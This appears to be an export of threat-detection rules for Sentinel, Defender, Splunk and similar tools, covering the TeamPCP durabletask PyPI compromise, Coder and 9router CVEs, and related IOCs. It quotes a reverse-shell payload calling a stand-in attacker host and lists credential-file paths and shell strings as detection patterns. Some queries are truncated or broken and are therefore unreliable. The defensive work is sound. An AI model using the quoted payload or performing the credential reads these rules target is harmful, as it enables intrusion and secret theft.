[LLM] Compromised Microsoft durabletask PyPI Package Install (TeamPCP 1.4.1-1.4.3) Delivery High
Detects pip/python installing the TeamPCP-compromised durabletask versions (1.4.0-1.4.3) — Microsoft's Durable Task Python SDK was published with a malicious dropper that fetches rope.pyz. Article-specific because it pins the exact package + version range named in the campaign. Rationale: Anchors on the exact package name 'durabletask' and version range from the article's code blocks plus external corroboration (Wiz, safedep, Aikido confirmed 1.4.1-1.4.3 as the malicious versions published 2026-05-19). pip+package-name+specific-version is high-fidelity — there is no legitimate reason to pin those exact malicious versions. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://www.stepsecurity.io/blog/microsofts-durabletask-pypi-package-compromised-in-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1195.002 T1059.006

DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("pip","pip3","python","python3","python3.10","python3.11","python3.12")
    or InitiatingProcessFileName in~ ("pip","pip3","python","python3")
| where ProcessCommandLine has "durabletask" or InitiatingProcessCommandLine has "durabletask"
| where ProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
    or InitiatingProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("pip","pip3","python","python3")
| where ActingProcessCommandLine has "durabletask"
| where ActingProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine

[LLM] TeamPCP rope.pyz Dropper Fetch from check.git-service.com C2 Command & Control High
Detects DNS, HTTP, or direct-IP egress to the TeamPCP C2 infrastructure that hosts the durabletask second-stage dropper (rope.pyz). Article-specific because it pins the exact filename and the campaign's named C2 domains. Rationale: Uses the exact payload filename 'rope.pyz' from article code-block 3 and the campaign C2 domain check.git-service.com confirmed by Wiz, safedep, and Aikido. No legitimate developer infrastructure resolves these domains — they were registered 2026-05-16 by the actor and have no clean use case. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud • https://thehackernews.com/2026/05/github-investigating-teampcp-claimed.html

[LLM] TeamPCP rope.pyz Dropper Infection Markers on Linux Installation High
Detects creation of TeamPCP's on-disk artifacts from the durabletask compromise: the rope.pyz / managed.pyz dropper payloads in /tmp/ and the ~/.cache/.sys-update-check infection marker. Article-specific because rope.pyz is named verbatim in code block 3. Rationale: Anchors on the verbatim 'rope.pyz' filename from article code block 3, plus the marker files /tmp/managed.pyz and ~/.cache/.sys-update-check confirmed by Wiz, safedep, and Aikido as the dropper's on-disk artifacts. None of these paths/filenames have legitimate Linux usage — they are unique to this campaign. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1105 T1036.005
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where (FolderPath has "/tmp/" and (FileName matches regex @"^rope-.+\.pyz$" or FileName =~ "rope.pyz" or FileName =~ "managed.pyz"))
    or (FolderPath has "/.cache/" and FileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256, FileSize
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified")
| where (TargetFilePath has "/tmp/" and (TargetFileName matches regex @"^rope-.+\.pyz$" or TargetFileName =~ "rope.pyz" or TargetFileName =~ "managed.pyz"))
    or (TargetFilePath has "/.cache/" and TargetFileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc

[LLM] AWS SSM SendCommand Fan-out from EC2 Instance Role (TeamPCP Worm Propagation) Actions on Objectives Medium
Detects the durabletask worm's lateral-movement stage: a single EC2-instance IAM role calling ssm:SendCommand against multiple EC2 instances within a short window. The rope.pyz worm uses stolen instance-role credentials to push itself to peer instances via SSM RunCommand. Rationale: Captures the worm's worm-stage primitive (ssm:SendCommand from an instance role to peer instances) which Wiz and safedep flagged as the AWS-specific propagation method. CloudTrail-only — Defender XDR and Falcon FDR don't ingest AWS control-plane events, hence empty defender_kql / falcon_logscale_query. Sentinel has the AWSCloudTrail connector but the table isn't in our canonical schema, so left empty rather than guess column names. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/
ATT&CKT1021.007 T1651 T1078.004
Data sourcesChange.All_Changes
source:cloudtrail @evt.name:SendCommand @userIdentity.type:AssumedRole @requestParameters.instanceIds:* (-@userAgent:(*aws-cli/* AND *root/*) AND -@userIdentity.sessionContext.sessionIssuer.userName:(*ssm-automation* OR *patch-manager* OR *config-rule*))
CLOUD
`cloudtrail` eventName=SendCommand eventSource="ssm.amazonaws.com" "userIdentity.type"="AssumedRole" 
| eval source_role=mvindex(split('userIdentity.sessionContext.sessionIssuer.arn',"/"),-1)
| eval target_count=mvcount('requestParameters.instanceIds{}')
| stats latest(_time) as last_seen dc('requestParameters.instanceIds{}') as DistinctTargets values('requestParameters.instanceIds{}') as Targets values(sourceIPAddress) as SourceIPs values(userAgent) as UAs by source_role 'userIdentity.arn' awsRegion
| where DistinctTargets >= 3 OR like(source_role, "%ec2%") OR like(source_role, "%-instance-%")
| sort 0 -last_seen
[LLM] Python Process Reading Multi-Cloud Credential Stores (durabletask Stealer Stage) Actions on Objectives Medium
Detects a single Python process opening credential files from THREE OR MORE distinct cloud/dev ecosystems within a 5-minute window — the signature behaviour of the rope.pyz multi-cloud stealer that harvests AWS, Azure, GCP, Kubernetes, npm, GitHub, Docker, and SSH secrets in one pass. Rationale: Targets the rope.pyz second-stage behaviour that Wiz and safedep documented: a single python process enumerating credentials across AWS + Azure + GCP + Kubernetes + npm + GitHub + Docker + SSH within seconds. The DistinctSecretFamilies>=3 threshold eliminates legitimate cloud SDKs that touch one ecosystem at a time while still catching the multi-cloud stealer in a single hit. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/
ATT&CKT1552.001 T1555.005 T1528
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileOpened","FileCreated","FileRenamed")
| where InitiatingProcessFileName in~ ("python","python3","python3.10","python3.11","python3.12")
| extend SecretFamily = case(
    FolderPath has "/.aws/","aws",
    FolderPath has "/.azure/","azure",
    FolderPath has "/.config/gcloud/","gcp",
    FolderPath has "/.kube/","k8s",
    FolderPath has "/.docker/","docker",
    FileName =~ ".npmrc","npm",
    FileName =~ ".git-credentials","git",
    FolderPath has "/.config/gh/" and FileName =~ "hosts.yml","gh",
    FolderPath has "/.ssh/" and FileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(strcat(FolderPath,"/",FileName), 20), Cmd = any(InitiatingProcessCommandLine), arg_min(Timestamp, *) by DeviceName, InitiatingProcessAccountName, InitiatingProcessId, bin(Timestamp, 5m)
| where DistinctSecretFamilies >= 3
| where InitiatingProcessAccountName !endswith "$"
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("python","python3")
| extend SecretFamily = case(
    TargetFilePath has "/.aws/","aws",
    TargetFilePath has "/.azure/","azure",
    TargetFilePath has "/.config/gcloud/","gcp",
    TargetFilePath has "/.kube/","k8s",
    TargetFilePath has "/.docker/","docker",
    TargetFileName =~ ".npmrc","npm",
    TargetFileName =~ ".git-credentials","git",
    TargetFilePath has "/.config/gh/" and TargetFileName =~ "hosts.yml","gh",
    TargetFilePath has "/.ssh/" and TargetFileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(TargetFilePath, 20), Cmd = any(ActingProcessCommandLine), arg_min(TimeGenerated, *) by DvcHostname, ActorUsername, ActingProcessId, bin(TimeGenerated, 5m)
| where DistinctSecretFamilies >= 3
| order by TimeGenerated desc
source:linux.auditd (@auditd.type:OPENAT OR @auditd.type:PATH) @process.executable.path:(*/python OR */python3 OR */python3.*) @file.path:(*/.aws/credentials OR */.aws/config OR */.azure/accessTokens.json OR */.azure/azureProfile.json OR */.config/gcloud/credentials.db OR */.config/gcloud/application_default_credentials.json OR */.kube/config OR */.npmrc OR */.docker/config.json OR */.git-credentials OR */.config/gh/hosts.yml OR */.ssh/id_*)
#event_simpleName=FileOpenInfo ContextImageFileName=/\/python3?(\.\d+)?$/i TargetFileName=/(\/\.aws\/(credentials|config)|\/\.azure\/(accessTokens|azureProfile)\.json|\/\.config\/gcloud\/(credentials\.db|application_default_credentials\.json)|\/\.kube\/config|\/\.npmrc|\/\.docker\/config\.json|\/\.git-credentials|\/\.config\/gh\/hosts\.yml|\/\.ssh\/id_)/i
| case {
    TargetFileName=/\.aws\// | SecretFamily:="aws";
    TargetFileName=/\.azure\// | SecretFamily:="azure";
    TargetFileName=/gcloud\// | SecretFamily:="gcp";
    TargetFileName=/\.kube\// | SecretFamily:="k8s";
    TargetFileName=/\.docker\// | SecretFamily:="docker";
    TargetFileName=/\.npmrc/ | SecretFamily:="npm";
    TargetFileName=/\.git-credentials|\.config\/gh\// | SecretFamily:="git";
    TargetFileName=/\.ssh\/id_/ | SecretFamily:="ssh";
    *;
  }
| groupBy([aid, ComputerName, ContextProcessId], function=[count(field=SecretFamily, distinct=true, as=DistinctFamilies), collect([SecretFamily, TargetFileName])])
| DistinctFamilies>=3

| tstats summariesonly=false count from datamodel=Endpoint.Filesystem where Filesystem.process_name IN ("python","python3","python3.10","python3.11","python3.12") AND (Filesystem.file_path="*/.aws/credentials" OR Filesystem.file_path="*/.aws/config" OR Filesystem.file_path="*/.azure/accessTokens.json" OR Filesystem.file_path="*/.azure/azureProfile.json" OR Filesystem.file_path="*/.config/gcloud/credentials.db" OR Filesystem.file_path="*/.config/gcloud/application_default_credentials.json" OR Filesystem.file_path="*/.kube/config" OR Filesystem.file_path="*/.npmrc" OR Filesystem.file_path="*/.docker/config.json" OR Filesystem.file_path="*/.git-credentials" OR Filesystem.file_path="*/.config/gh/hosts.yml" OR Filesystem.file_path="*/.ssh/id_*") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.process_id Filesystem.file_path _time | `drop_dm_object_name(Filesystem)` | bin _time span=5m | stats dc(file_path) as DistinctSecretFamilies values(file_path) as Paths min(_time) as first by dest user process_id _time | where DistinctSecretFamilies >= 3 | sort 0 -first
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT

    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

title: File or Process Matching Article Hash IOCs
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0b
status: experimental
description: |

[LLM] Coder CVE-2026-46354 - Burst of azure-instance-identity POSTs (vmId enumeration / forged PKCS#7) Exploitation Medium
Detects multiple POST requests to the unauthenticated /api/v2/workspaceagents/azure-instance-identity endpoint from a single source within a short window — the signature of an attacker enumerating workspace vmId UUIDs to brute-force-redeem agent tokens via the forged PKCS#7 envelope flaw. A legitimate Coder workspace agent only registers once per VM lifetime, so >=5 POSTs to this exact path from one source in 10 minutes is anomalous. Rationale: The endpoint path is uniquely identified in the advisory as the unauthenticated PKCS#7 verification entry point. Burst-from-one-source on this specific path is the visible HTTP-layer shape of vmId UUID enumeration described in the article. Cross-checked Coder's public API docs at coder.com/docs/reference/api/agents to confirm the endpoint exists in legitimate v2 deployments. Defender Advanced Hunting has no native HTTP request log for self-hosted Coder, so defender_kql is intentionally empty. Falcon LogScale FDR does not ship application-layer HTTP request URLs from Coder, so falcon_logscale_query is also empty. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://github.com/coder/coder/pull/25286
ATT&CKT1190 T1133

            FirstSeen = min(TimeGenerated),

            by SrcIpAddr, DstHostname, bin(TimeGenerated, WindowMin)

| order by Attempts desc

[LLM] Coder CVE-2026-46354 - Agent token redemption: PKCS#7 POST followed by gitsshkey / external-auth GET Actions on Objectives High
Correlates a POST to /api/v2/workspaceagents/azure-instance-identity with a GET to /workspaceagents/me/gitsshkey or /workspaceagents/me/external-auth from the same source IP within 30 minutes — the exact two-step attack flow the advisory documents (forge PKCS#7 envelope → use returned agent session token to pull Git SSH private key and OAuth credentials). This catches the credential-access stage even when a single vmId is targeted (UC1's burst signal misses). Rationale: The advisory explicitly chains POST /azure-instance-identity (token issuance) to GET /me/gitsshkey and GET /me/external-auth (credential read) as the documented post-exploit steps. Same-source-IP join with a 30-minute window captures the attacker round-trip while remaining tight enough to drop unrelated traffic. Endpoints confirmed in Coder's public API reference. Defender XDR lacks application HTTP logs for self-hosted Coder; Falcon FDR same — both left empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://coder.com/docs/admin/external-auth
ATT&CKT1528 T1552.004 T1190

[LLM] Coder CVE-2026-46354 - Inventory of vulnerable Coder v2 versions Reconnaissance High
Hygiene hunt: enumerate all hosts running an unpatched Coder v2 server using Defender TVM CVE data and surface those that are internet-facing first. The advisory lists six patched lines (v2.33.3 / v2.32.2 / v2.31.12 / v2.30.8 / v2.29.13 / v2.24.5); anything earlier on each line is exploitable without authentication. Pairs with UC1/UC2 to prioritise instances that need either immediate patching or a switch to token-based agent auth. Rationale: DeviceTvmSoftwareVulnerabilities is the canonical Defender table for CVE-based exposure tracking; pairing with DeviceInfo's IsInternetFacing flag surfaces the highest-risk hosts first. The CVE ID and patched-version list come directly from the GHSA advisory body. Datadog logs and Falcon FDR don't carry SBOM/CVE rollups in their standard log tables, so those fields are empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://github.com/coder/coder/pull/25286
ATT&CKT1190

// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities

| where CveId in~ ("CVE-2026-46354")

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

DeviceTvmSoftwareVulnerabilities

Detects HTTP POST to the unauthenticated 9router cowork-settings endpoint with a customPlugins array containing an executable command field — the registration step of CVE-2026-46339 RCE before the SSE-triggered spawn(). Default Docker exposure is 0.0.0.0:20128. Rationale: The article names the exact vulnerable POST endpoint /api/cli-tools/cowork-settings (src/app/api/cli-tools/cowork-settings/route.js lines 292-319) and the Docker default port 20128. Any external unauthenticated POST to this path is exploitation by definition since the route is unguarded by middleware (src/proxy.js matcher) and the customPlugins.command/args fields are stored verbatim into globalThis.__9routerCustomPlugins. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj
ATT&CKT1190
Data sourcesWeb.Web
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "POST"
| where Url has "/api/cli-tools/cowork-settings"
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, Url, HttpMethod, HttpStatusCode, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

[LLM] 9router CVE-2026-46339 — GET /api/mcp/{plugin}/sse triggers stored command spawn() Exploitation High
Detects unauthenticated HTTP GET to /api/mcp/<plugin>/sse on 9router — the second step of CVE-2026-46339 that invokes Node.js spawn() with the attacker-controlled command/args previously registered via /api/cli-tools/cowork-settings. Time-to-exploit from registration is under 2 seconds. Rationale: The article names the exact trigger endpoint /api/mcp/<plugin>/sse (src/app/api/mcp/[plugin]/sse/route.js lines 6-25) and identifies it as the unguarded GET that invokes spawn() with attacker-supplied command/args. Pairing this UC with the POST-registration UC gives the analyst the full two-step exploit chain on the wire and is high-fidelity because the route is normally only used by authenticated dashboard sessions. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

[LLM] 9router Node.js process spawning shell binary (CVE-2026-46339 post-exploit) Installation High
Detects /bin/sh, /bin/bash or other shells spawned with node (server.js / next-server) as the parent process — direct host-side evidence of CVE-2026-46339 plugin-bridge RCE where attacker-controlled command/args reach Node's spawn() via the MCP stdio→SSE bridge. Rationale: The article describes the exact code path src/lib/mcp/stdioSseBridge.js line 138 calling spawn(plugin.command, plugin.args) with attacker-controlled values. The PoC payloads use /bin/sh -c and /bin/bash -i directly, so a node→shell parent-child pair on a 9router host is high-fidelity exploitation evidence — Node.js apps in production rarely shell out to /bin/sh directly. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj
ATT&CKT1059.004 T1190

DeviceProcessEvents

| where FileName in~ ("sh","bash","dash","ash","zsh","ksh")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,

| order by TimeGenerated desc

[LLM] Reverse shell from 9router-spawned shell — outbound TCP from node-child bash Command & Control Medium
Detects outbound network connections originating from /bin/bash or /bin/sh processes whose parent is node — the typical reverse-shell post-exploitation pattern of CVE-2026-46339, including the PoC payload `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`. Rationale: The article's PoC explicitly shows `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` as the reverse-shell payload registered via customPlugins.args. Detecting node→bash→outbound-TCP at the EDR layer catches the actual exploitation impact even when web-tier logs are unavailable (reverse-proxy not in scope or container egress). Sentinel KQL omitted: ImNetworkSession lacks initiating-process correlation fields and Linux Syslog/auditd entries reach Sentinel without the structured parent-process linkage needed for high fidelity. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj
ATT&CKT1059.004 T1071.001 T1095

   or InitiatingProcessCommandLine has_any ("/dev/tcp/","bash -i","nc -e")
| where RemoteIPType == "Public"

| order by Timestamp desc

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46339")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
